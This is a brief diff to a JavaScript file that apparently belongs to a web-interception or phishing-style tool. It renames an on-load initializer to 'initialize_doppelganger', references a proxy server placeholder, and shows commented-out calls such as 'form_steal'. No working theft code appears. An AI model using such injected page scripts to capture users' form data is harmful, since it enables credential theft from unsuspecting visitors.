@@ -1,6 +1,6 @@
 var httpServer="http://proxyIpAddr:httpPort"
 
-function initialize()
+function initialize_doppelganger()
 {
 	//display_calling_card();
 	//form_steal();
@@ -54,4 +54,5 @@ function break_fixit()
 {
 }
 
-Event.observe(window, "load", function() { initialize(); });
+Event.observe(window, "load", function() { initialize_doppelganger(); })
+
